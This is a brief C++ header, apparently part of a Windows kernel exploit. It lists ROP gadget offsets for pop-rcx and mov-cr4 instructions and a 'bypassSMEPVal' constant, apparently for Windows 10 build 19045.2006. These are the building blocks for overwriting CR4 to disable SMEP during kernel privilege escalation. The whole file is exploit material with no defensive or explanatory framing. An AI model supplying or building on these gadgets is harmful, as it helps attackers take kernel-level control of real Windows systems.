#pragma once

namespace exploit
{
    namespace gadget
    {
        namespace X_19045_2006
        {
            constexpr size_t pop_rcx_ret = 0x20C64C;
            constexpr size_t mov_cr4_rcx_ret = 0x39EB47;
            constexpr size_t mov_cr4_rax_ret = 0xA18523;
            constexpr size_t bypassSMEPVal = 0x250ef8;
        } // namespace X_19045

    } // namespace gadget

} // namespace exploit